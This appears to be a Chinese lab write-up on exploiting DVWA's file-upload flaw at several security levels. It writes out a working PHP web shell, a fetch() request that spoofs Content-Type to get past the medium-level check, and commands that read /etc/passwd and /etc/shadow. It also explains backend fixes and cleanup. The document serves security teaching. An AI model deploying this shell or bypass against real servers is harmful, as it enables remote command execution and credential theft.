# 9.28 文件上传 → getshell

## 一、shell.php文件

```bash
echo '<?php system($_GET["cmd"]); ?>' > ~/shell.php
```

放家目录，因为浏览器选文件时默认就停在这。

## 二、low 档：传上去就能执行

DVWA Security 切到 `low`，File Upload 选 `~/shell.php` 上传，页面回显：

```
../../hackable/uploads/shell.php succesfully uploaded!
```

顺带把服务器自己的目录结构也告诉我了。

浏览器打开：

```
http://192.168.10.137/DVWA-master/hackable/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`?cmd=` 后面写什么，`system()` 就把那串当命令跑。

它会执行，是因为三个条件同时成立：① 服务端没校验后缀和真实类型 ② 上传目录在网站目录里，浏览器能直接访问 ③ Apache 看见 `.php` 就交给 PHP 引擎。

它看的是**后缀**，不看文件里写了什么，也不管是谁传的。

## 三、空白页不是没执行

```
?cmd=cat /etc/passwd     → 读出来了
?cmd=cat /etc/shadow     → 页面一片空白
```

`cat /etc/shadow` 失败了，但报错走的是 **stderr**，而 `system()` 只把 **stdout** 打到网页上，所以什么也看不见。

要看见得把 stderr 接到 stdout 上（`2>&1`；URL 里 `>` 写 `%3E`、`&` 写 `%26`）：

```
?cmd=cat%20/etc/shadow%202%3E%261
```

`/etc/passwd` 权限是 `644`，谁都能读；`/etc/shadow` 是 `640 root:shadow`，`www-data` 读不了 —— 拿到 shell 不等于拿到 root。

## 四、medium 档：改一个词就绕过去

源码 `vulnerabilities/upload/source/medium.php`：

```php
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];                            // 第 10 行
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&   // 第 14 行
    ( $uploaded_size < 100000 ) ) {                                          // 第 15 行
```


它查的 `$_FILES['uploaded']['type']` 是**客户端在请求里自己填的**，不是文件真实内容。

浏览器按扩展名自动填这个值，`.php` 填的当然不是图片，所以在页面上直接传一定被拒

中文版 Edge 的控制台要先输入 `允许粘贴` 回车才放行粘贴（输 `allow pasting` 会报 `Uncaught SyntaxError: Unexpected identifier 'pasting'`）。

第一段（`Content-Type: application/x-php`）打完输出 `被拦`；第二段只把这一处改成 `image/jpeg`，输出 `上传成功`：

```js
fetch("/DVWA-master/vulnerabilities/upload/",{method:"POST",headers:{"Content-Type":"multipart/form-data; boundary=XX"},body:'--XX\r\nContent-Disposition: form-data; name="uploaded"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--XX\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n--XX--\r\n'}).then(r=>r.text()).then(t=>console.log(t.includes("succesfully uploaded")?"上传成功":"被拦"))
```

再开 `?cmd=id`，还是 `uid=33(www-data)`。

自报的类型是可以改的，这道门等于从里面开。

## 五、四个档位

| 档位 | 做了什么 | 结果 |
|---|---|---|
| low | 零校验 | `.php` 直接执行 |
| medium | 查 `$_FILES['type']`（第 10、14–15 行） | 请求里把 Content-Type 改成 `image/jpeg` 就过 |
| high | 后缀白名单 + `getimagesize()`（第 10、15–17 行） | `.php` 和 `.jpg` 都被拒，回显一样：`We can only accept JPEG or PNG images.` |
| impossible | 随机重命名 + GD 重编码 | 存出来不是 `.php`，名字也猜不到 |

`vulnerabilities/upload/source/high.php`：

```php
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);   // 第 10 行
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&   // 第 15 行
    ( $uploaded_size < 100000 ) &&                                                                                                 // 第 16 行
    getimagesize( $uploaded_tmp ) ) {                                                                                              // 第 17 行
```

high 档两道条件卡在一起：后缀要在白名单里（第 15 行），`getimagesize()` 还要能从文件头读出图片宽高（第 17 行）。传 `.php` 卡在第一条，传 `.jpg` 卡在第二条，回显相同，页面上看不出是被哪一条拦的。

被拒时走的是 `else` 分支，回显写在第 31 行。

修在后端：白名单后缀（不是黑名单）、用 `getimagesize()` 验真实类型、上传后重命名、上传目录禁止解析 PHP。

## 六、清理

```bash
sudo rm -f /var/www/html/DVWA-master/hackable/uploads/shell.php
ls -l /var/www/html/DVWA-master/hackable/uploads/
```

再看 `?cmd=id` → `404 Not Found`。

`ls -l` 里属主是 `www-data www-data`，文件是网站进程写进去的。

## 七、三个漏洞的 payload 落在哪

| 漏洞 | payload 是什么 | 在哪执行 | 能跑系统命令吗 |
|---|---|---|---|
| SQL 注入 | SQL 语句 | MySQL 进程 | 不能，MySQL 没有执行系统命令的语法；要跑得先 `INTO OUTFILE` 写文件 |
| XSS | JavaScript | 受害者的浏览器 | 不能，够不到服务器 |
| 文件上传 | 一个 php 文件 | 服务器的 PHP 进程 | 能，身份是 www-data |
